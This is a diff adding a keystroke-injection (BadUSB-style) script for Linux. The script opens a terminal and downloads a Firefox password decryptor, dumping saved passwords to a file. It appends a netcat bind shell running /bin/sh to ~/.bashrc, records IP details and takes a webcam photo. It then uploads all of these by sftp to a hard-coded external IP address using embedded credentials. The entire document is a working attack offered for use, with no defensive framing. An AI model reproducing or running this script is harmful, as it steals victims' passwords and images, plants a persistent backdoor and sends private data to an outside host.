@@ -1,0 +1,43 @@
+CTRL ALT t
+DELAY 1000
+STRING cd $home
+ENTER
+DELAY 250
+STRING wget https://raw.githubusercontent.com/unode/firefox_decrypt/master/firefox_decrypt.py
+ENTER
+DELAY 2000
+STRING python3 firefox_decrypt.py > mdp.txt
+ENTER
+DELAY 500
+STRING 2
+ENTER
+DELAY 100
+STRING echo nc -lvp 49000 -e /bin/sh >> ~/.bashrc
+ENTER
+DELAY 100
+STRING ip -c a > ip.txt
+ENTER
+DELAY 100
+STRING fswebcam pic
+ENTER
+DELAY 100
+STRING sftp -P 49000 PA@86.242.170.158
+ENTER
+DELAY 300
+STRING PA2cmort
+ENTER
+DELAY 1000
+STRING cd file
+ENTER
+DELAY 100
+STRING put mdp.txt
+ENTER
+DELAY 100
+STRING put ip.txt
+ENTER
+DELAY 100
+STRING put pic
+ENTER
+DELAY 250
+STRING exit
+ENTER
